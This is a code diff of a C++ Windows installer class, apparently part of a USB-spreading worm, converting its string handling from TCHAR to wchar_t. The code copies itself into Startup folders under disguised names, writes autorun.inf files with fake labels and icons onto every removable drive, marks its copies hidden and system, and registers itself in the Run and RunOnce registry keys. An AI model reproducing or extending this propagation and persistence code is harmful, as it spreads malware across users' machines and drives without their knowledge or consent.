@@ -11,33 +11,33 @@ Installer::Installer()
 	GetModuleFileName(NULL, exeName, MAX_PATH);
 
 
-	TCHAR *appData;
+	wchar_t *appData;
 	size_t appDataSize;
-	_tdupenv_s(&appData, &appDataSize, _T("APPDATA"));
+	_wdupenv_s(&appData, &appDataSize, L"APPDATA");
 
 	appDataPath[0] = '\0';
-	_tcscat_s(appDataPath, appData);
-	_tcscat_s(appDataPath, _T("\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\") V_FAKE_NAME1);
+	wcscat_s(appDataPath, appData);
+	wcscat_s(appDataPath, L"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" V_FAKE_NAME1);
 
 	registryPath[0] = '\0';
-	_tcscat_s(registryPath, appData);
-	_tcscat_s(registryPath, _T("\\") V_FAKE_NAME2);
+	wcscat_s(registryPath, appData);
+	wcscat_s(registryPath, L"\\" V_FAKE_NAME2);
 
 	free(appData);
 
 	startupPath[0] = '\0';
-	_tcscat_s(startupPath, _T("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\") V_FAKE_NAME3);
+	wcscat_s(startupPath, L"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" V_FAKE_NAME3);
 
 
-	const TCHAR* autorunStrU =
-		_T("[autorun]\r\n")
-		_T("label=")  V_FAKE_USB_LABEL  _T("\r\n")
-		_T("action=") V_FAKE_USB_ACTION _T("\r\n")
-		_T("open=")   V_FAKE_USB_FILE   _T("\r\n")
-		_T("icon=")   V_FAKE_USB_FILE   _T(",0");
-	const std::string autorunStrCpp = Util::t2s(autorunStrU);
+	const wchar_t* autorunStrU =
+		L"[autorun]\r\n"
+		L"label="  V_FAKE_USB_LABEL  L"\r\n"
+		L"action=" V_FAKE_USB_ACTION L"\r\n"
+		L"open="   V_FAKE_USB_FILE   L"\r\n"
+		L"icon="   V_FAKE_USB_FILE   L",0";
+	const std::wstring autorunStrCpp = autorunStrU;
 
-	autorunBytes = autorunStrCpp.size();
+	autorunBytes = autorunStrCpp.length();
 	memcpy(autorunData, autorunStrCpp.c_str(), autorunBytes);
 
 }
@@ -53,18 +53,18 @@ bool Installer::SetAutorun(bool autorun)
 
 bool Installer::InstallOnDrives()
 {
-	TCHAR drive[_MAX_PATH] = _T(" :\\");
+	wchar_t drive[_MAX_PATH] = L" :\\";
 
-	for (TCHAR c = 'A'; c <= 'Z'; c++) {
+	for (wchar_t c = 'A'; c <= 'Z'; c++) {
 		drive[0] = c;
 
 		this->InstallOnDrive(drive);
 	}
 	return true;
 }
-bool Installer::InstallOnDrive(const TCHAR* drive)
+bool Installer::InstallOnDrive(const wchar_t* drive)
 {
-	TCHAR target[_MAX_PATH] = {0};
+	wchar_t target[_MAX_PATH] = { 0 };
 
 	if (GetDriveType(drive) != DRIVE_REMOVABLE) {
 		return false;
@@ -79,7 +79,7 @@ bool Installer::InstallOnDrive(const TCHAR* drive)
 	}
 
 	target[0] = '\0';
-	if (!(PathAppend(target, drive) && PathAppend(target, _T("autorun.inf")))) {
+	if (!(PathAppend(target, drive) && PathAppend(target, L"autorun.inf"))) {
 		return false;
 	}
 
@@ -90,14 +90,14 @@ bool Installer::InstallOnDrive(const TCHAR* drive)
 	}
 
 	DWORD written;
-	bool ret = TRUE == WriteFile(hFile, autorunData, autorunBytes, &written, NULL);
+	bool ret = (TRUE == WriteFile(hFile, autorunData, autorunBytes, &written, NULL));
 	VLog(LMESSAGE, target);
 
 	CloseHandle(hFile);
 	return ret;
 }
 
-bool Installer::CopyTo(const TCHAR* path)
+bool Installer::CopyTo(const wchar_t* path)
 {
 	if (GetFileAttributes(path) != INVALID_FILE_ATTRIBUTES)
 	{
@@ -110,11 +110,11 @@ bool Installer::CopyTo(const TCHAR* path)
 	}
 	else
 	{
-		VLog(LNOTICE, "Failed to copy file");
+		VLog(LNOTICE, L"Failed to copy file");
 		return false;
 	}
 }
-bool Installer::HideFile(const TCHAR* path)
+bool Installer::HideFile(const wchar_t* path)
 {
 	return TRUE == SetFileAttributes(path, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
 }
@@ -145,21 +145,21 @@ bool Installer::SetAutorunRegistry(bool autorun)
 	bool ret = false;
 
 	ret |= this->SetAutorunRegistryWithKey(autorun, HKEY_CURRENT_USER,
-		_T("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"));
+		L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
 
 	ret |= this->SetAutorunRegistryWithKey(autorun, HKEY_CURRENT_USER,
-		_T("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"));
+		L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce");
 
 	ret |= this->SetAutorunRegistryWithKey(autorun, HKEY_LOCAL_MACHINE,
-		_T("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"));
+		L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
 
 	ret |= this->SetAutorunRegistryWithKey(autorun, HKEY_LOCAL_MACHINE,
-		_T("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"));
+		L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce");
 
 	return ret;
 }
 
-bool Installer::SetAutorunRegistryWithKey(bool autorun, HKEY key, const TCHAR* subkey) {
+bool Installer::SetAutorunRegistryWithKey(bool autorun, HKEY key, const wchar_t* subkey) {
 	HKEY hKey;
 
 	if (RegCreateKeyEx(key, subkey,
@@ -179,7 +179,7 @@ bool Installer::SetAutorunRegistryWithKey(bool autorun, HKEY key, const TCHAR* s
 		}
 
 		if (RegSetValueEx(hKey, V_FAKE_NAME2, 0, REG_SZ,
-			(const BYTE*)registryPath, (lstrlen(registryPath) + 1) * sizeof(TCHAR))
+			(const BYTE*)registryPath, (lstrlen(registryPath) + 1) * sizeof(wchar_t))
 			!= ERROR_SUCCESS)
 		{
 			goto g_end;
